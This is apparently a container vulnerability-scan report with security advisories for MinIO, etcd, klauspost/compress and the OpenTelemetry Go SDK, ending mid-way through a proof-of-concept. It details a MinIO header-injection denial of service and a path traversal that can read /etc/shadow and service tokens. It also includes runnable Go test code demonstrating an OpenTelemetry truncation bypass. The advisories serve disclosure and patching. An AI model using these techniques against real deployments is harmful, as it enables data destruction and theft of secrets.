- [MinIO AIStor](https://min.io/aistor)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-34204?s=github&n=minio&ns=github.com%2Fminio&t=golang&vr=%3E%3D0.0.0-20240328174456-468a9fae83e9%2C%3C%3D0.0.0-20260212201848-7aac2a2c5b7c"><img alt="high 7.1: CVE--2026--34204" src="https://img.shields.io/badge/CVE--2026--34204-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Authentication</i>

<table>
<tr><td>Affected range</td><td><code>>=0.0.0-20240328174456-468a9fae83e9<br/><=0.0.0-20260212201848-7aac2a2c5b7c</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.232%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Impact

_What kind of vulnerability is it? Who is impacted?_

A flaw in `extractMetadataFromMime()` allows any authenticated user with `s3:PutObject` permission to inject internal server-side encryption metadata into objects by sending crafted `X-Minio-Replication-*` headers on a normal PutObject request. The server unconditionally maps these headers to `X-Minio-Internal-*` encryption metadata without verifying that the request is a legitimate replication request. Objects written this way carry bogus encryption keys and become **permanently unreadable** through the S3 API.

Any authenticated user or service with `s3:PutObject` permission on any bucket can make objects permanently unreadable by injecting fake SSE encryption metadata. The attacker sends a standard PutObject request with `X-Minio-Replication-Server-Side-Encryption-*` headers but **without** the `X-Minio-Source-Replication-Request` header that marks legitimate replication traffic. The server maps these headers to internal encryption metadata (`X-Minio-Internal-Server-Side-Encryption-Sealed-Key`, etc.), causing all subsequent GetObject and HeadObject calls to treat the object as encrypted with keys that do not exist.

This is a targeted denial-of-service vulnerability. An attacker can selectively corrupt individual objects or entire buckets. The `ReplicateObjectAction` IAM permission is never checked because the request is a normal PutObject, not a replication request.

**Affected component:** `cmd/handler-utils.go`, function `extractMetadataFromMime()`.

## Affected Versions

All MinIO releases through the final release of the minio/minio open-source project.

The vulnerability was introduced in commit `468a9fae83e965ecefa1c1fdc2fc57b84ece95b0` ("Enable replication of SSE-C objects", [PR #19107](https://github.com/minio/minio/pull/19107), 2024-03-28). The first affected release is `RELEASE.2024-03-30T09-41-56Z`.

## Patches

**Fixed in**: MinIO AIStor RELEASE.2026-03-26T21-24-40Z

### Binary Downloads

| Platform | Architecture | Download |
| -------- | ------------ | -------- |
| Linux | amd64 | [minio](https://dl.min.io/aistor/minio/release/linux-amd64/minio) |
| Linux | arm64 | [minio](https://dl.min.io/aistor/minio/release/linux-arm64/minio) |
| macOS | arm64 | [minio](https://dl.min.io/aistor/minio/release/darwin-arm64/minio) |
| macOS | amd64 | [minio](https://dl.min.io/aistor/minio/release/darwin-amd64/minio) |
| Windows | amd64 | [minio.exe](https://dl.min.io/aistor/minio/release/windows-amd64/minio.exe) |

### FIPS Binaries

| Platform | Architecture | Download |
| -------- | ------------ | -------- |
| Linux | amd64 | [minio.fips](https://dl.min.io/aistor/minio/release/linux-amd64/minio.fips) |
| Linux | arm64 | [minio.fips](https://dl.min.io/aistor/minio/release/linux-arm64/minio.fips) |

### Package Downloads

| Format | Architecture | Download |
| ------ | ------------ | -------- |
| DEB | amd64 | [minio_20260326212440.0.0_amd64.deb](https://dl.min.io/aistor/minio/release/linux-amd64/minio_20260326212440.0.0_amd64.deb) |
| DEB | arm64 | [minio_20260326212440.0.0_arm64.deb](https://dl.min.io/aistor/minio/release/linux-arm64/minio_20260326212440.0.0_arm64.deb) |
| RPM | amd64 | [minio-20260326212440.0.0-1.x86_64.rpm](https://dl.min.io/aistor/minio/release/linux-amd64/minio-20260326212440.0.0-1.x86_64.rpm) |
| RPM | arm64 | [minio-20260326212440.0.0-1.aarch64.rpm](https://dl.min.io/aistor/minio/release/linux-arm64/minio-20260326212440.0.0-1.aarch64.rpm) |

### Container Images

```bash
# Standard
docker pull quay.io/minio/aistor/minio:RELEASE.2026-03-26T21-24-40Z
podman pull quay.io/minio/aistor/minio:RELEASE.2026-03-26T21-24-40Z

# FIPS
docker pull quay.io/minio/aistor/minio:RELEASE.2026-03-26T21-24-40Z.fips
podman pull quay.io/minio/aistor/minio:RELEASE.2026-03-26T21-24-40Z.fips
```

### Homebrew (macOS)

```bash
brew install minio/aistor/minio
```

## Workarounds

[Users of the open-source `minio/minio` project should upgrade to MinIO AIStor `RELEASE.2026-03-26T21-24-40Z` or later.](https://docs.min.io/enterprise/aistor-object-store/upgrade-aistor-server/community-edition/)

If upgrading is not immediately possible:

- **Restrict replication headers at a reverse proxy / load balancer.** Drop or reject any request containing `X-Minio-Replication-Server-Side-Encryption-*` headers that does not also carry `X-Minio-Source-Replication-Request`. This blocks the injection path without modifying the server.

- **Audit IAM policies.** Limit `s3:PutObject` grants to trusted principals. While this reduces the attack surface, it does not eliminate the vulnerability since any authorized user can exploit it.

## References

- Introducing commit: [`468a9fae8`](https://github.com/minio/minio/commit/468a9fae83e965ecefa1c1fdc2fc57b84ece95b0) ([PR #19107](https://github.com/minio/minio/pull/19107))
- [MinIO AIStor](https://min.io/aistor)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42600?s=github&n=minio&ns=github.com%2Fminio&t=golang&vr=%3E%3D0.0.0-20220724015452%2C%3C0.0.0-20260414213245"><img alt="medium 6.9: CVE--2026--42600" src="https://img.shields.io/badge/CVE--2026--42600-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code>>=0.0.0-20220724015452<br/><0.0.0-20260414213245</code></td></tr>
<tr><td>Fixed version</td><td><code>0.0.0-20260414213245</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.474%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

_What kind of vulnerability is it? Who is impacted?_

A path traversal vulnerability in MinIO's `ReadMultiple` internode storage-REST
endpoint allows a caller holding the cluster root JWT to read files from
outside the configured drive roots, bounded only by the MinIO process UID.

Distributed-erasure (multi-node) MinIO deployments are impacted. Single-node
standalone deployments do not register the route and are not affected. The
attack requires an HS512 JWT signed with `MINIO_ROOT_PASSWORD` and carrying
`accessKey = MINIO_ROOT_USER` — the same secret every peer in the cluster
holds to authenticate internode traffic, so a compromised peer or any actor in
possession of the root credential can mint one.

The `ReadMultiple` handler (`cmd/storage-rest-server.go`) decodes a msgpack
`ReadMultipleReq` body containing `Bucket`, `Prefix`, and `Files` fields and
forwards them to `xlStorage.ReadMultiple` (`cmd/xl-storage.go`) without
validation:

```go
volumeDir := pathJoin(s.drivePath, req.Bucket)          // traversal resolves here
for _, f := range req.Files {
    fullPath := pathJoin(volumeDir, req.Prefix, f)
    data, mt, err = s.readAllDataWithDMTime(ctx, req.Bucket, volumeDir, fullPath)
}
```

`pathJoin` calls `path.Clean`, which resolves `..` components and produces an
absolute path anywhere on the filesystem — it is not a root jail. The global
`setRequestValidityMiddleware` rejects `..` in `r.URL.Path` and `r.Form` but
does not inspect request bodies, so msgpack-encoded traversal bypasses it.
Sibling storage methods (`StatInfoFile`, `ReadFileHandler`, `ReadVersion`)
validate their volume argument through `s.getVolDir(volume)`, which rejects
`..`; `ReadMultiple` skips this call.

The attacker sends `POST /minio/storage/{drivePath}/v63/rmpl` with a
msgpack-encoded body carrying `../` sequences in the `Bucket` field. The
server opens the resulting path via `os.OpenFile` with `O_RDONLY|O_NOATIME`
and returns its contents in the msgpack response stream.

**Impact by deployment:**

- **Bare-metal with `User=minio` in the systemd unit** — the `O_NOATIME`
  ownership check bounds the read to files owned by the MinIO UID. Reachable
  secrets include TLS private keys, KMS/KES key material, systemd credentials,
  and data belonging to other tenants sharing the same UID on the host.
  Secrets leaked this way persist across cluster credential rotation.

- **Containerized running as UID 0** (the historical default for the official
  Docker image, `docker-compose` examples, and Helm charts without
  `securityContext.runAsNonRoot`) — the primitive escalates to arbitrary
  host-filesystem disclosure: `/etc/shadow`, `/root/**`, Kubernetes
  service-account tokens, cloud-init metadata caches.

**Affected components:** `cmd/storage-rest-server.go` (`ReadMultiple` handler),
`cmd/xl-storage.go` (`xlStorage.ReadMultiple`).

**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory
— 'Path Traversal')

**CVSS v4.0 Score:** 6.9 (Medium)

**Vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`

### Affected Versions

All MinIO releases from `RELEASE.2022-07-24T01-54-52Z` through the final
release of the minio/minio open-source project, `RELEASE.2025-09-07T16-13-09Z`.

The vulnerability was introduced in commit
[`f939d1c18`](https://github.com/minio/minio/commit/f939d1c1831c71f4b1c14df6d9cd62b12ccce7a3)
("Independent Multipart Uploads",
[PR #15346](https://github.com/minio/minio/pull/15346)), which added the
`ReadMultiple` storage-REST endpoint as part of the multipart upload
redesign. The first affected release is `RELEASE.2022-07-24T01-54-52Z`.

### Patches

**Fixed in**: MinIO AIStor `RELEASE.2026-04-14T21-32-45Z` (recommended
upgrade target). The fix — which removed the `ReadMultiple` handler, the
corresponding storage-driver method, the msgpack datatypes, the REST-client
wrapper, and the route registration — first shipped in **MinIO AIStor
`RELEASE.2024-10-23T19-38-07Z`**. Every AIStor release from
`RELEASE.2024-10-23T19-38-07Z` onward is unaffected; users should upgrade to
`RELEASE.2026-04-14T21-32-45Z` or later to pick up the accumulated fixes and
improvements shipped since.

#### Binary Downloads

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio](https://dl.min.io/aistor/minio/release/linux-amd64/minio)           |
| Linux    | arm64        | [minio](https://dl.min.io/aistor/minio/release/linux-arm64/minio)           |
| macOS    | arm64        | [minio](https://dl.min.io/aistor/minio/release/darwin-arm64/minio)          |
| macOS    | amd64        | [minio](https://dl.min.io/aistor/minio/release/darwin-amd64/minio)          |
| Windows  | amd64        | [minio.exe](https://dl.min.io/aistor/minio/release/windows-amd64/minio.exe) |

#### FIPS Binaries

| Platform | Architecture | Download                                                                    |
| -------- | ------------ | --------------------------------------------------------------------------- |
| Linux    | amd64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-amd64/minio.fips) |
| Linux    | arm64        | [minio.fips](https://dl.min.io/aistor/minio/release/linux-arm64/minio.fips) |

#### Package Downloads

| Format | Architecture | Download                                                                                                                            |
| ------ | ------------ | ----------------------------------------------------------------------------------------------------------------------------------- |
| DEB    | amd64        | [minio_20260414213245.0.0_amd64.deb](https://dl.min.io/aistor/minio/release/linux-amd64/minio_20260414213245.0.0_amd64.deb)         |
| DEB    | arm64        | [minio_20260414213245.0.0_arm64.deb](https://dl.min.io/aistor/minio/release/linux-arm64/minio_20260414213245.0.0_arm64.deb)         |
| RPM    | amd64        | [minio-20260414213245.0.0-1.x86_64.rpm](https://dl.min.io/aistor/minio/release/linux-amd64/minio-20260414213245.0.0-1.x86_64.rpm)   |
| RPM    | arm64        | [minio-20260414213245.0.0-1.aarch64.rpm](https://dl.min.io/aistor/minio/release/linux-arm64/minio-20260414213245.0.0-1.aarch64.rpm) |

#### Container Images

```bash
# Standard
docker pull quay.io/minio/aistor/minio:RELEASE.2026-04-14T21-32-45Z
podman pull quay.io/minio/aistor/minio:RELEASE.2026-04-14T21-32-45Z

# FIPS
docker pull quay.io/minio/aistor/minio:RELEASE.2026-04-14T21-32-45Z.fips
podman pull quay.io/minio/aistor/minio:RELEASE.2026-04-14T21-32-45Z.fips
```

#### Homebrew (macOS)

```bash
brew install minio/aistor/minio
```

### Workarounds

- [Users of the open-source `minio/minio` project should upgrade to MinIO AIStor `RELEASE.2026-04-14T21-32-45Z` or later.](https://docs.min.io/enterprise/aistor-object-store/upgrade-aistor-server/community-edition/)

If upgrading is not immediately possible:

- **Rotate the root credential and restrict who holds it.** The exploit
  requires a JWT signed with `MINIO_ROOT_PASSWORD`. Treat the root credential
  as the host-filesystem disclosure primitive that it is: rotate it after any
  suspected exposure, store it only in the secret manager that bootstraps the
  cluster, and do not hand it to applications or operators who only need
  object-level access.

- **Do not run the MinIO container as UID 0.** Set
  `securityContext.runAsNonRoot: true` (and a non-zero `runAsUser`) in
  Kubernetes manifests, or add `--user` to `docker run`. This reduces the
  blast radius from arbitrary host-filesystem disclosure to MinIO-UID-owned
  files only.

- **Restrict the internode storage-REST port at the network layer.** In
  distributed deployments, the storage-REST route is served on the same port
  as the S3 API by default. Where feasible, use `--internode-port` to expose
  internode traffic on a separate interface reachable only from other cluster
  peers, and block that interface from client networks.

### Credits

- **Finders:** Discovered by Claude, Anthropic's AI assistant, and triaged by
  **Adrian Denkiewicz** at **Doyensec** in collaboration with **Anthropic
  Research**.

### Resources

- Introducing commit: [`f939d1c18`](https://github.com/minio/minio/commit/f939d1c1831c71f4b1c14df6d9cd62b12ccce7a3)
  ([PR #15346](https://github.com/minio/minio/pull/15346))
- [CWE-22 — Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [CVE-2022-35919 — MinIO admin-authenticated path traversal in server-update endpoint (same class, different channel)](https://github.com/minio/minio/security/advisories/GHSA-gr9v-6pcm-rqvg)
- [MinIO AIStor](https://min.io/aistor)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>go.etcd.io/etcd/client/pkg/v3</strong> <code>3.5.19</code> (golang)</summary>

<small><code>pkg:golang/go.etcd.io/etcd/client/pkg/v3@3.5.19</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-73500?s=golang&n=v3&ns=go.etcd.io%2Fetcd%2Fclient%2Fpkg&t=golang&vr=%3C3.5.33"><img alt="high : CVE--2026--73500" src="https://img.shields.io/badge/CVE--2026--73500-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.5.33</code></td></tr>
<tr><td>Fixed version</td><td><code>3.5.33</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.697%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In go.etcd.io/etcd/client/pkg/v3 before 3.5.33, 3.6.14, and 3.7.1, TLS handshakes on listeners created by NewTLSListener do not enforce a handshake deadline. An unauthenticated network attacker who connects to an etcd TLS listener without sending a ClientHello causes a goroutine and a tracking map entry to block indefinitely. Opening many such connections exhausts memory, leading to a denial of service.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/klauspost/compress</strong> <code>1.18.7</code> (golang)</summary>

<small><code>pkg:golang/github.com/klauspost/compress@1.18.7</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-116591?s=golang&n=compress&ns=github.com%2Fklauspost&t=golang&vr=%3C1.20.2"><img alt="high : CVE--2026--116591" src="https://img.shields.io/badge/CVE--2026--116591-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.20.2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.20.2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.530%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Panic on two-block frames in github.com/klauspost/compress

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>go.etcd.io/etcd/client/pkg/v3</strong> <code>3.5.21</code> (golang)</summary>

<small><code>pkg:golang/go.etcd.io/etcd/client/pkg/v3@3.5.21</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-73500?s=golang&n=v3&ns=go.etcd.io%2Fetcd%2Fclient%2Fpkg&t=golang&vr=%3C3.5.33"><img alt="high : CVE--2026--73500" src="https://img.shields.io/badge/CVE--2026--73500-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;3.5.33</code></td></tr>
<tr><td>Fixed version</td><td><code>3.5.33</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.697%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In go.etcd.io/etcd/client/pkg/v3 before 3.5.33, 3.6.14, and 3.7.1, TLS handshakes on listeners created by NewTLSListener do not enforce a handshake deadline. An unauthenticated network attacker who connects to an etcd TLS listener without sending a ClientHello causes a goroutine and a tracking map entry to block indefinitely. Opening many such connections exhausts memory, leading to a denial of service.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>go.opentelemetry.io/otel/sdk</strong> <code>1.44.0</code> (golang)</summary>

<small><code>pkg:golang/go.opentelemetry.io/otel/sdk@1.44.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-128085?s=github&n=sdk&ns=go.opentelemetry.io%2Fotel&t=golang&vr=%3E%3D1.33.0%2C%3C1.47.0"><img alt="medium 5.3: CVE--2026--128085" src="https://img.shields.io/badge/CVE--2026--128085-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Incorrect Calculation of Multi-Byte String Length</i>

<table>
<tr><td>Affected range</td><td><code>>=1.33.0<br/><1.47.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.47.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.524%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

The `AttributeValueLengthLimit` span/log-record limit can be bypassed entirely with attribute values that consist of valid U+FFFD (REPLACEMENT CHARACTER) runes. The counting-based truncation introduced by the fix for GHSA-p9f8-wvj8-2fg8 (commit `e016a78c9`, first released in v1.33.0) has an "optimistic" fast path that skips every U+FFFD without counting it and without falling back to the correct slow path. A value of 1000 U+FFFD runes (3000 bytes) is stored verbatim even with a limit of 5 characters (15 bytes). The same defect affects the attribute truncation paths in `go.opentelemetry.io/otel/sdk/trace` (`sdk/internal/attrnorm`), `go.opentelemetry.io/otel/sdk/log` (`sdk/log/internal/attrnorm`), and the auto-instrumentation tracer in `go.opentelemetry.io/otel/trace` (`trace/auto.go`, introduced in `v1.35.0`).

This is an incomplete-fix issue: it is a distinct defect in the replacement code that GHSA-p9f8-wvj8-2fg8 introduced, affecting exactly the versions that advisory says are fixed (>= v1.33.0). The original advisory covers only the pre-v1.33.0 code.

## Details

The shared truncation helper is generated from `internal/shared/attrnorm/truncate.go.tmpl`. In the v1.46.0 release, the generated copies are `sdk/internal/attrnorm/truncate.go` and `sdk/log/internal/attrnorm/truncate.go` (identical logic, different package names). The optimistic path (v1.46.0, `sdk/internal/attrnorm/truncate.go:175-199`) is:

```go
// Optimistically, assume all valid UTF-8.
var b strings.Builder
count := 0
for i, c := range s {
    if c != utf8.RuneError {
        count++
        if count > limit {
            return s[:i]
        }
        continue
    }
    _, size := utf8.DecodeRuneInString(s[i:])
    if size == 1 {
        // invalid encoding: fall through to the correct slow path
        ...
        break
    }
}
```

`range` over a string yields `utf8.RuneError` both for invalid bytes (size 1) and for a legitimately encoded U+FFFD (size 3). Only the size-1 case enters the slow path. A valid U+FFFD rune is therefore neither counted nor truncating: the loop slides over it. Consequences:

1. A value made only of valid U+FFFD runes never increments `count`, so no truncation ever triggers and the value is returned unchanged, whatever its length.
2. In a mixed string, every U+FFFD contributes 3 bytes that are not counted, and the final `return s[:i]` keeps all previously skipped U+FFFD runes, so the retained size grows linearly with the number of U+FFFD runes and is not bounded by `limit`.

The OpenTelemetry specification states that truncation applies "counting any character in it as 1". A valid U+FFFD is one character and must count as 1; here it counts as 0. The regression test suite of the repository contains no U+FFFD case, which is why this went unnoticed.

Call chains (v1.46.0):

- trace: `span.SetAttributes` -> `sdk/trace/span.go` (`normAttr`) -> `attrnorm.Truncate` -> `sdk/internal/attrnorm/truncate.go` (`truncate`)
- log: `Record.AddAttributes` / `SetAttributes` -> `sdk/log/record.go` (`attrnorm.TruncateValue`) -> `sdk/log/internal/attrnorm/truncate.go` (`truncate`)

Deduplication: GHSA-p9f8-wvj8-2fg8 describes the pre-v1.33.0 helper (`safeTruncateValidUTF8`), which gave up truncating entirely for strings containing RuneError. The rewrite in `e016a78c9` replaced that code; this report concerns the rewritten code, is present only in versions that the advisory lists as fixed, and no public issue or advisory describes it.

## PoC

Minimal reproduction with the published release (no repository checkout needed). Go 1.25+ is required (the release declares `go 1.25.0`; any recent toolchain auto-selects one).

Create a directory with these files.

`go.mod` (then run `go mod tidy` once to fill `go.sum`):

```
module otelpoc

go 1.25.0

require (
	go.opentelemetry.io/otel v1.46.0
	go.opentelemetry.io/otel/log v0.22.0
	go.opentelemetry.io/otel/sdk v1.46.0
	go.opentelemetry.io/otel/sdk/log v0.22.0
	go.opentelemetry.io/otel/trace v1.46.0
)
```

`otelgo_truncate_test.go`:

```go
package otelpoc

import (
	"context"
	"strings"
	"testing"
	"unicode/utf8"

	"go.opentelemetry.io/otel/attribute"
	sdktrace "go.opentelemetry.io/otel/sdk/trace"
	"go.opentelemetry.io/otel/sdk/trace/tracetest"
	"go.opentelemetry.io/otel/trace"
)

// limitsWithLen returns span limits with AttributeValueLengthLimit=limit and
// everything else unlimited, isolating the length-limit enforcement under test.
func limitsWithLen(limit int) sdktrace.SpanLimits {
	lim := sdktrace.NewSpanLimits()
	lim.AttributeValueLengthLimit = limit
	lim.AttributeCountLimit = -1
	lim.AttributePerEventCountLimit = -1
	lim.AttributePerLinkCountLimit = -1
	lim.EventCountLimit = -1
	lim.LinkCountLimit = -1
	return lim
}

func captureOneSpan(t *testing.T, limit int, attrs ...attribute.KeyValue) []attribute.KeyValue {
	t.Helper()
	sr := tracetest.NewSpanRecorder()
	tp := sdktrace.NewTracerProvider(
		sdktrace.WithSpanProcessor(sr),
		sdktrace.WithSpanLimits(limitsWithLen(limit)),
	)
	defer func() { _ = tp.Shutdown(context.Background()) }()

	tr := tp.Tracer("poc")
	_, span := tr.Start(context.Background(), "op")
	span.SetAttributes(attrs...)
	span.End()

	ended := sr.Ended()
	if len(ended) != 1 {
		t.Fatalf("expected 1 ended span, got %d", len(ended))
	}
	return ended[0].Attributes()
}

// TestOT001_FFFDOnlyStringBypassesTraceLengthLimit demonstrates that a string
// attribute composed of valid U+FFFD runes is stored completely untruncated
// although AttributeValueLengthLimit=5.
func TestOT001_FFFDOnlyStringBypassesTraceLengthLimit(t *testing.T) {
	const limit = 5
	val := strings.Repeat("\uFFFD", 1000) // 1000 chars, 3000 bytes

	got := captureOneSpan(t, limit, attribute.String("k", val))
	if len(got) != 1 {
		t.Fatalf("expected 1 attribute, got %d", len(got))
	}
	stored := got[0].Value.AsString()
	t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(val), len(val),
		utf8.RuneCountInString(stored), len(stored), limit)
	// Per OTel spec ("counting any character in it as 1") the stored value
	// must be at most `limit` characters (<= 15 bytes for U+FFFD).
	if maxBytes := 3 * limit; len(stored) > maxBytes {
		t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)",
			limit, len(stored), maxBytes)
	}
}

// TestOT001_FFFDMixedStringOverRetains demonstrates that valid U+FFFD runes
// are not counted in the optimistic truncation path: every U+FFFD adds 3
// uncounted bytes to the retained value.
func TestOT001_FFFDMixedStringOverRetains(t *testing.T) {
	const limit = 5
	val := strings.Repeat("\uFFFD", 100) + strings.Repeat("A", 6) // 106 chars, 306 bytes

	got := captureOneSpan(t, limit, attribute.String("k", val))
	stored := got[0].Value.AsString()
	t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(val), len(val),
		utf8.RuneCountInString(stored), len(stored), limit)
	if chars := utf8.RuneCountInString(stored); chars > limit {
		t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d chars / %d bytes stored",
			limit, chars, len(stored))
	}
}

// TestOT001_ASCIIControl is the control case: plain ASCII over-limit values
// ARE truncated, proving the length limit is active in the same setup.
func TestOT001_ASCIIControl(t *testing.T) {
	const limit = 5
	val := strings.Repeat("B", 20)

	got := captureOneSpan(t, limit, attribute.String("k", val))
	stored := got[0].Value.AsString()
	t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(val), len(val),
		utf8.RuneCountInString(stored), len(stored), limit)
	if len(stored) != limit {
		t.Fatalf("control failed: ASCII value not truncated (stored %d bytes)", len(stored))
	}
}

// TestOT001_EventAttributesNotLengthTruncated documents that span-event
// attributes bypass AttributeValueLengthLimit entirely (no attrnorm.Truncate
// call in recordingSpan.addEvent).
func TestOT001_EventAttributesNotLengthTruncated(t *testing.T) {
	const limit = 5
	val := strings.Repeat("C", 100)

	sr := tracetest.NewSpanRecorder()
	tp := sdktrace.NewTracerProvider(
		sdktrace.WithSpanProcessor(sr),
		sdktrace.WithSpanLimits(limitsWithLen(limit)),
	)
	defer func() { _ = tp.Shutdown(context.Background()) }()
	tr := tp.Tracer("poc")
	_, span := tr.Start(context.Background(), "op")
	span.AddEvent("ev", trace.WithAttributes(attribute.String("k", val)))
	span.End()

	ended := sr.Ended()
	events := ended[0].Events()
	if len(events) != 1 {
		t.Fatalf("expected 1 event, got %d", len(events))
	}
	stored := events[0].Attributes[0].Value.AsString()
	t.Logf("event attribute input: %d bytes; stored: %d bytes; limit=%d", len(val), len(stored), limit)
	if len(stored) > limit {
		t.Logf("CONFIRMED: event attribute not length-truncated (%d bytes > limit %d)", len(stored), limit)
	}
}
```

(The `-run` pattern above selects the three truncation cases plus the control; the fourth test function is included because it is part of the exact file that produced the output below - it compiles but is not selected by the pattern, and its output does not appear.)

`otelgo_log_truncate_test.go`:

```go
package otelpoc

import (
	"context"
	"strings"
	"sync"
	"testing"
	"unicode/utf8"

	"go.opentelemetry.io/otel/attribute"
	apisdk "go.opentelemetry.io/otel/log"
	sdklog "go.opentelemetry.io/otel/sdk/log"
)

type captureProcessor struct {
	mu   sync.Mutex
	recs []*sdklog.Record
}

func (c *captureProcessor) Enabled(context.Context, sdklog.EnabledParameters) bool { return true }

func (c *captureProcessor) OnEmit(_ context.Context, r *sdklog.Record) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	clone := r.Clone()
	c.recs = append(c.recs, &clone)
	return nil
}

func (c *captureProcessor) Shutdown(context.Context) error { return nil }
func (c *captureProcessor) ForceFlush(context.Context) error {
	return nil
}

// TestOT001_FFFDOnlyStringBypassesLogLengthLimit repeats the bypass against
// the sdk/log attribute path (sdk/log/internal/attrnorm, same template).
func TestOT001_FFFDOnlyStringBypassesLogLengthLimit(t *testing.T) {
	const limit = 5
	cp := &captureProcessor{}
	lp := sdklog.NewLoggerProvider(
		sdklog.WithProcessor(cp),
		sdklog.WithAttributeValueLengthLimit(limit),
	)
	defer func() { _ = lp.Shutdown(context.Background()) }()

	logger := lp.Logger("poc")
	var r apisdk.Record
	r.SetSeverity(apisdk.SeverityInfo)
	r.AddAttributes(attribute.String("k", strings.Repeat("\uFFFD", 1000)))
	logger.Emit(context.Background(), r)

	cp.mu.Lock()
	if len(cp.recs) != 1 {
		t.Fatalf("expected 1 record, got %d", len(cp.recs))
	}
	rec := cp.recs[0]
	cp.mu.Unlock()

	stored := ""
	rec.WalkAttributes(func(kv attribute.KeyValue) bool {
		if string(kv.Key) == "k" {
			stored = kv.Value.AsString()
		}
		return true
	})
	t.Logf("sdk/log input: 1000 chars / 3000 bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(stored), len(stored), limit)
	if maxBytes := 3 * limit; len(stored) > maxBytes {
		t.Fatalf("BYPASS: sdk/log WithAttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)",
